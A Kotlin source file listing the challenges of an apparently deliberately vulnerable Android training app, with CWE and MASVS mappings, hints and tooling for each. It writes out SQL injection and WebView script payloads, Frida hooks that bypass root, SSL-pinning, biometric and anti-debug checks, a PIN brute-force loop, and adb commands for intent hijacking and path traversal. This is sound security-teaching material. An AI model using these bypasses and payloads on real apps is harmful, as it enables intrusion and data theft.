package com.evilcorp.android.model

/** Single source of truth for UI totals, scoring and tests. Keep ids stable. */
object ChallengeCatalog {
    val all: List<Challenge> = listOf(
        Challenge(
            id = "prefs", title = "SharedPreferences Storage",
            description = "Session secrets written to SharedPreferences in plaintext.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-1", maswe = "MASWE-0006", cvss = "5.0 (Medium)",
            hints = listOf(
                "Android keeps SharedPreferences as XML files inside the app sandbox.",
                "Look under /data/data/com.evilcorp.android/shared_prefs/.",
                "On a debuggable build: adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls shared_prefs\n" +
                "adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml\n\n" +
                "// Frida: log every SharedPreferences write\n" +
                "Java.perform(() => {\n" +
                "  const E = Java.use('android.app.SharedPreferencesImpl\$EditorImpl');\n" +
                "  E.putString.implementation = function (k, v) { console.log(k + ' = ' + v); return this.putString(k, v); };\n" +
                "});",
        ),
        Challenge(
            id = "sqli", title = "SQLite Injection",
            description = "Login query built by string concatenation against a local SQLite database.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-89", masvs = "CODE-4", maswe = "MASWE-0079", cvss = "7.5 (High)",
            hints = listOf(
                "The query is SELECT username, role, note FROM users WHERE username='…' AND password='…'.",
                "Try closing the quote yourself: ' OR 1=1 --",
                "You want the admin row: ' OR role='admin' --",
            ),
            tooling = "// Frida: print every SQL statement\n" +
                "Java.perform(() => {\n" +
                "  const DB = Java.use('android.database.sqlite.SQLiteDatabase');\n" +
                "  DB.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function (q, a) {\n" +
                "    console.log('SQL: ' + q); return this.rawQuery(q, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "secrets", title = "Hardcoded Secrets",
            description = "An API key compiled into the APK gates a privileged endpoint.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-798", masvs = "CRYPTO-2", maswe = "MASWE-0005", cvss = "7.5 (High)",
            hints = listOf(
                "The key never leaves the device, so it must be inside the APK.",
                "Decompile with jadx or run `apktool d` and grep for 'key'.",
                "The key is Base64-encoded in HardcodedSecretsLab.kt, decode it.",
            ),
            tooling = "apktool d app-debug.apk -o out && grep -ri 'EC_API' out/smali*\n" +
                "jadx -d out-jadx app-debug.apk   # open HardcodedSecretsLab\n" +
                "echo '<base64>' | base64 -d",
        ),
        Challenge(
            id = "logging", title = "Insecure Logging",
            description = "Credentials and a session token are written to logcat.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-532", masvs = "STORAGE-2", maswe = "MASWE-0001", cvss = "5.0 (Medium)",
            hints = listOf(
                "Press Login, then look at the system log, not the screen.",
                "adb logcat | grep EvilCorpAuth",
                "The token field in the log line is the flag.",
            ),
            tooling = "adb logcat -c && adb logcat -s EvilCorpAuth:D\n" +
                "adb logcat --pid=\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "crypto", title = "Broken Cryptography",
            description = "AES-ECB with a key hardcoded in the app protects the vault blob.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-327", masvs = "CRYPTO-1", maswe = "MASWE-0020", cvss = "7.4 (High)",
            hints = listOf(
                "Identical plaintext blocks encrypt to identical ciphertext blocks in ECB mode.",
                "Find the 16-byte key in BrokenCryptoLab.kt (jadx).",
                "Decrypt the Base64 blob with AES/ECB/PKCS5Padding using that key.",
            ),
            tooling = "echo '<blob>' | base64 -d | openssl enc -d -aes-128-ecb -K \$(printf '<key>' | xxd -p)\n\n" +
                "// Frida: capture keys passed to javax.crypto\n" +
                "Java.perform(() => {\n" +
                "  const S = Java.use('javax.crypto.spec.SecretKeySpec');\n" +
                "  S.\$init.overload('[B', 'java.lang.String').implementation = function (k, a) {\n" +
                "    console.log(a + ' key=' + Java.use('java.lang.String').\$new(k)); return this.\$init(k, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "random", title = "Weak Random Generation",
            description = "A password-reset token comes from java.util.Random seeded with a leaked timestamp.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-338", masvs = "CRYPTO-1", maswe = "MASWE-0027", cvss = "7.5 (High)",
            hints = listOf(
                "java.util.Random is a deterministic LCG: same seed, same output.",
                "The 'requested at' epoch second is the seed.",
                "token = java.util.Random(seed).nextLong().toString(36)",
            ),
            tooling = "// jshell or Kotlin script\n" +
                "jshell> new java.util.Random(<epochSeconds>L).nextLong()\n" +
                "jshell> Long.toString(new java.util.Random(<epochSeconds>L).nextLong(), 36)",
        ),
        Challenge(
            id = "webview", title = "WebView JavaScript Bridge",
            description = "Unsanitized HTML is rendered in a WebView that exposes a native JS interface.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-79", masvs = "PLATFORM-2", maswe = "MASWE-0068", cvss = "8.1 (High)",
            hints = listOf(
                "Your input is placed into the page without encoding, so HTML and script run.",
                "A Java object is exposed to JavaScript under the name EvilBridge.",
                "<script>document.body.innerText = EvilBridge.getFlag()</script>",
            ),
            tooling = "// Inject:\n<script>document.body.innerText = EvilBridge.getFlag()</script>\n\n" +
                "// Inspect via chrome://inspect (WebView debugging is enabled in this lab)\n" +
                "adb forward tcp:9222 localabstract:webview_devtools_remote_\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "provider", title = "Exported ContentProvider",
            description = "A ContentProvider is exported without permissions and returns internal notes.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-926", masvs = "PLATFORM-1", maswe = "MASWE-0063", cvss = "7.5 (High)",
            hints = listOf(
                "Check AndroidManifest.xml for android:exported=\"true\" on <provider>.",
                "The authority is com.evilcorp.android.notes.",
                "adb shell content query --uri content://com.evilcorp.android.notes/notes",
            ),
            tooling = "adb shell content query --uri content://com.evilcorp.android.notes/notes\n" +
                "adb shell dumpsys package com.evilcorp.android | grep -A3 -i provider\n" +
                "drozer console connect  ->  run app.provider.info -a com.evilcorp.android",
        ),
        Challenge(
            id = "deeplink", title = "Deep Link Abuse",
            description = "An exported activity trusts parameters from the evilcorp:// URL scheme.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-939", masvs = "PLATFORM-1", maswe = "MASWE-0058", cvss = "6.5 (Medium)",
            hints = listOf(
                "Find the <intent-filter> with the evilcorp scheme in the manifest.",
                "The handler supports a 'settings' host with a debug parameter.",
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"",
            ),
            tooling = "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"\n" +
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://pay?to=attacker&amount=999\"",
        ),
        Challenge(
            id = "root", title = "Root Detection Bypass",
            description = "A client-side root check decides whether the secure area opens.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0097", cvss = "4.3 (Medium)",
            hints = listOf(
                "The lab plants a synthetic su binary so the check always fires.",
                "The decision is a single boolean returned by RootChecker.isRooted().",
                "Hook it with Frida and return false. The indicator is re-planted on every attempt.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const R = Java.use('com.evilcorp.android.labs.RootChecker');\n" +
                "  R.isRooted.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or: objection -g com.evilcorp.android explore -> android root disable\n" +
                "# or: patch the APK (apktool d, edit smali, apktool b, apksigner)",
        ),
        Challenge(
            id = "cleartext", title = "Cleartext HTTP Session",
            description = "Credentials and a session token travel over unencrypted HTTP.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-319", masvs = "NETWORK-1", maswe = "MASWE-0050", cvss = "7.4 (High)",
            hints = listOf(
                "The manifest and network security config both permit cleartext traffic.",
                "Start the lab server, then forward its port to your computer.",
                "adb forward tcp:8080 tcp:8080 && curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login",
            ),
            tooling = "adb forward tcp:8080 tcp:8080\n" +
                "curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login\n" +
                "# look at the Set-Cookie header",
        ),
        Challenge(
            id = "external", title = "External Storage Leak",
            description = "A credentials backup is written to shared external storage.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-922", masvs = "STORAGE-2", maswe = "MASWE-0007", cvss = "5.5 (Medium)",
            hints = listOf(
                "Files under external storage are not private to the app.",
                "Path: /sdcard/Android/data/com.evilcorp.android/files/",
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
            ),
            tooling = "adb shell ls /sdcard/Android/data/com.evilcorp.android/files/\n" +
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
        ),
        Challenge(
            id = "broadcast", title = "Unprotected Broadcast Receiver",
            description = "An exported receiver accepts privilege changes from any app.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0064", cvss = "7.8 (High)",
            hints = listOf(
                "Look for <receiver android:exported=\"true\"> and its intent-filter action.",
                "The receiver reads a string extra named role.",
                "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin -n com.evilcorp.android/.labs.PromoteReceiver",
            ),
            tooling = "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin \\\n" +
                "  -n com.evilcorp.android/.labs.PromoteReceiver",
        ),
        Challenge(
            id = "clipboard", title = "Clipboard Leakage",
            description = "A secret is copied to the system clipboard without the sensitive flag.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "STORAGE-2", maswe = "MASWE-0053", cvss = "4.0 (Medium)",
            hints = listOf(
                "Any foreground app (and keyboards, clipboard managers) can read the clipboard.",
                "Press Copy, then paste into the field below.",
                "Hook ClipboardManager.setPrimaryClip to observe what the app copies.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const C = Java.use('android.content.ClipboardManager');\n" +
                "  C.setPrimaryClip.implementation = function (clip) {\n" +
                "    console.log(clip.getItemAt(0).getText()); return this.setPrimaryClip(clip);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "pin", title = "Vulnerable Vault PIN",
            description = "A 4-digit PIN checked client-side with an unsalted MD5 and no lockout.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-307", masvs = "AUTH-2", maswe = "MASWE-0036", cvss = "6.8 (Medium)",
            hints = listOf(
                "There are only 10,000 possible PINs and the app never rate-limits attempts.",
                "The expected hash is embedded in PinVaultLab.kt, MD5 of the PIN.",
                "Brute-force offline: for i in 0000..9999, compare md5(i) with the embedded hash.",
            ),
            tooling = "for i in \$(seq -w 0 9999); do\n" +
                "  [ \"\$(printf \$i | md5)\" = \"88cf91a1aef212f3c2cd12406983427d\" ] && echo PIN=\$i && break\n" +
                "done",
        ),
        Challenge(
            id = "screenshot", title = "Screenshot Leakage",
            description = "A sensitive screen can be captured because FLAG_SECURE is not set.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0055", cvss = "4.0 (Medium)",
            hints = listOf(
                "Without FLAG_SECURE the OS lets screenshots, screen recording and the recents thumbnail see the content.",
                "The flag is masked on screen. Capture the screen after pressing Reveal.",
                "adb exec-out screencap -p > shot.png",
            ),
            tooling = "adb exec-out screencap -p > shot.png\n" +
                "adb shell screenrecord /sdcard/rec.mp4",
        ),
        Challenge(
            id = "keystore", title = "PKCS#12 Keystore Misuse",
            description = "A portable PKCS#12 file with a default password replaces AndroidKeyStore.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-522", masvs = "CRYPTO-2", maswe = "MASWE-0013", cvss = "6.8 (Medium)",
            hints = listOf(
                "Provision the store first; it writes files/vault.p12 inside the app sandbox.",
                "Inspect WeakKeystore in jadx to find KEYSTORE_PASS.",
                "Enter the default Java keystore password 'changeit' or pull vault.p12 via run-as.",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/vault.p12 > vault.p12\n" +
                "keytool -list -v -keystore vault.p12 -storetype PKCS12 -storepass changeit",
        ),
        Challenge(
            id = "backup", title = "Android Backup & Plaintext Files",
            description = "Plaintext sync credentials in filesDir exposed by android:allowBackup=\"true\".",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-2", maswe = "MASWE-0008", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Write cloud sync config' to create the file in internal storage.",
                "Check files/cloud_sync_config.json inside the sandbox.",
                "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json\n" +
                "adb backup -f backup.ab com.evilcorp.android",
        ),
        Challenge(
            id = "sslpinning", title = "SSL Pinning Bypass",
            description = "Client-side SPKI certificate pinning enforced by a single boolean check.",
            difficulty = Difficulty.Hard, area = Area.Network,
            cwe = "CWE-295", masvs = "NETWORK-2", maswe = "MASWE-0047", cvss = "5.9 (Medium)",
            hints = listOf(
                "SslPinValidator.verifyCertificatePin() compares the presented pin against EXPECTED_PIN.",
                "Find SslPinValidator.EXPECTED_PIN in jadx or hook verifyCertificatePin() in Frida.",
                "Expected pin: sha256/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const V = Java.use('com.evilcorp.android.labs.SslPinValidator');\n" +
                "  V.verifyCertificatePin.implementation = function (pin) { return true; };\n" +
                "});",
        ),
        Challenge(
            id = "webviewfile", title = "WebView Universal File Access",
            description = "WebView with allowFileAccess and allowUniversalAccessFromFileURLs reads sandbox files.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-2", maswe = "MASWE-0070", cvss = "7.5 (High)",
            hints = listOf(
                "The lab writes a confidential note to files/internal_audit.txt on launch.",
                "The WebView allows loading file:// URLs directly.",
                "Load file:///data/data/com.evilcorp.android/files/internal_audit.txt",
            ),
            tooling = "# Enter in the WebView URL bar:\n" +
                "file:///data/data/com.evilcorp.android/files/internal_audit.txt",
        ),
        Challenge(
            id = "biometric", title = "Biometric Auth Bypass",
            description = "Event-bound biometric gate not tied to a Keystore CryptoObject.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-287", masvs = "AUTH-2", maswe = "MASWE-0033", cvss = "7.1 (High)",
            hints = listOf(
                "The vault checks BiometricGate.isBiometricVerified() without decrypting via Keystore.",
                "Hook BiometricGate.isBiometricVerified() with Frida to return true, or check QA_PROP in jadx.",
                "adb shell setprop debug.evilcorp.bio_override true",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const B = Java.use('com.evilcorp.android.labs.BiometricGate');\n" +
                "  B.isBiometricVerified.implementation = function () { return true; };\n" +
                "});\n\n" +
                "# or exploit the leftover QA system property:\n" +
                "adb shell setprop debug.evilcorp.bio_override true",
        ),
        Challenge(
            id = "antidebug", title = "Debugger & Frida Detection",
            description = "Telemetry key gated behind Debug.isDebuggerConnected, FLAG_DEBUGGABLE and TracerPid.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-4", maswe = "MASWE-0104", cvss = "4.3 (Medium)",
            hints = listOf(
                "AntiDebugCheck.isBeingDebugged() triggers because the training APK is debuggable.",
                "Hook isBeingDebugged() in Frida to return false, or inspect QA_BYPASS_PROP in AntiDebugLab.kt.",
                "adb shell setprop debug.evilcorp.allow_debug 1",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const A = Java.use('com.evilcorp.android.labs.AntiDebugCheck');\n" +
                "  A.isBeingDebugged.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or set the QA property discovered in jadx:\n" +
                "adb shell setprop debug.evilcorp.allow_debug 1",
        ),
        Challenge(
            id = "keyboard", title = "Keyboard & IME Cache Leak",
            description = "Predictive text caches sensitive recovery phrases in a personalized dictionary.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0054", cvss = "4.3 (Medium)",
            hints = listOf(
                "Press 'Sync IME learned dictionary' to write the personalized suggestion cache.",
                "Look for ime_learned_words.txt inside the app's files/ directory.",
                "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
        ),
        Challenge(
            id = "tampering", title = "Bytecode Tampering & Licensing",
            description = "Enterprise feature flag gated by an XOR license check in IntegrityGate.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-353", masvs = "RESILIENCE-2", maswe = "MASWE-0100", cvss = "5.3 (Medium)",
            hints = listOf(
                "Decompile IntegrityGate in TamperingLab.kt and inspect MASKED.",
                "Each integer in MASKED is XORed with 0x5A to form the license string.",
                "The decoded license key is EC-ENT-2026-PRO (or hook verifyLicense() to return true).",
            ),
            tooling = "python3 -c 'm=[0x1F,0x19,0x77,0x1F,0x14,0x0E,0x77,0x68,0x6A,0x68,0x6C,0x77,0x0A,0x08,0x15];print(\"\".join(chr(x^0x5A) for x in m))'\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.IntegrityGate').verifyLicense.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "httpcache", title = "HTTP Disk Cache Leak",
            description = "Authenticated API responses are cached unencrypted under cache/http_cache/.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-524", masvs = "STORAGE-2", maswe = "MASWE-0009", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Fetch /v1/account/statement' to populate the HTTP disk cache.",
                "The UI redacts audit_token, but the raw response is stored under cache/http_cache/.",
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls -la cache/http_cache/\n" +
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
        ),
        Challenge(
            id = "pendingintent", title = "Mutable PendingIntent Hijack",
            description = "An implicit base Intent wrapped with FLAG_MUTABLE lets receivers hijack execution.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0065", cvss = "7.8 (High)",
            hints = listOf(
                "Press 'Broadcast mutable PendingIntent' or trigger PendingIntentHijackReceiver via adb.",
                "The receiver listens for com.evilcorp.android.ACTION_DISPATCH_PI.",
                "Press 'Broadcast mutable PendingIntent', then 'Refresh capture log' (or check logcat EvilCorpPI).",
            ),
            tooling = "adb logcat -s EvilCorpPI:W\n" +
                "adb shell am broadcast -a com.evilcorp.android.ACTION_DISPATCH_PI \\\n" +
                "  --es hijack_mode hijack -n com.evilcorp.android/.labs.PendingIntentHijackReceiver",
        ),
        Challenge(
            id = "tapjacking", title = "Tapjacking / Obscured Touch",
            description = "Sensitive approval button accepts touches when covered by an overlay window.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-1021", masvs = "PLATFORM-3", maswe = "MASWE-0056", cvss = "6.1 (Medium)",
            hints = listOf(
                "Keep 'Simulated bait overlay: ON' and 'filterTouchesWhenObscured: OFF'.",
                "Tap the green 'Tap Here to Claim Free Coffee' bait button.",
                "Now toggle 'filterTouchesWhenObscured: ON' to see how Android blocks the obscured touch.",
            ),
            tooling = "// Verify in layouts or View code:\n" +
                "view.filterTouchesWhenObscured = true\n" +
                "window.setHideOverlayWindows(true) // API 31+",
        ),
        Challenge(
            id = "memory", title = "Sensitive Data in Heap Memory",
            description = "Clearing the UI leaves the master secret in an immutable String on the JVM heap.",
            difficulty = Difficulty.Hard, area = Area.Storage,
            cwe = "CWE-316", masvs = "STORAGE-2", maswe = "MASWE-0004", cvss = "6.2 (Medium)",
            hints = listOf(
                "Press '1. Load secret into memory', then '2. Lock & Clear Screen'.",
                "Dump the Java heap with `adb shell am dumpheap` or read MemoryVault.retainedHeapSecret.",
                "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof && adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY",
            ),
            tooling = "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof\n" +
                "adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  console.log(Java.use('com.evilcorp.android.labs.MemoryVault').retainedHeapSecret.value);\n" +
                "});",
        ),
        Challenge(
            id = "intentredirect", title = "Intent Redirection",
            description = "An exported proxy activity launches non-exported internal activities via extras.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-940", masvs = "PLATFORM-1", maswe = "MASWE-0061", cvss = "8.1 (High)",
            hints = listOf(
                "InternalAdminActivity has android:exported=\"false\" and cannot be started directly.",
                "IntentRedirectActivity is exported and reads a string extra named 'target_class'.",
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity --es target_class com.evilcorp.android.labs.InternalAdminActivity",
            ),
            tooling = "# Direct launch fails with SecurityException:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.InternalAdminActivity\n\n" +
                "# Pivot via exported IntentRedirectActivity:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity \\\n" +
                "  --es target_class com.evilcorp.android.labs.InternalAdminActivity",
        ),
        Challenge(
            id = "pathtraversal", title = "Zip Slip / Path Traversal",
            description = "Archive extraction joins paths without canonicalPath validation.",
            difficulty = Difficulty.Hard, area = Area.Storage,
            cwe = "CWE-22", masvs = "CODE-4", maswe = "MASWE-0081", cvss = "7.5 (High)",
            hints = listOf(
                "The importer writes to File(files/themes, entryName) without checking for '..'.",
                "The vault unlocks when files/admin_override.flag contains UNLOCK.",
                "Set filename to ../admin_override.flag and content to UNLOCK, then extract.",
            ),
            tooling = "# Filename:\n../admin_override.flag\n# Content:\nUNLOCK",
        ),
    )

    fun byId(id: String): Challenge? = all.firstOrNull { it.id == id }
}
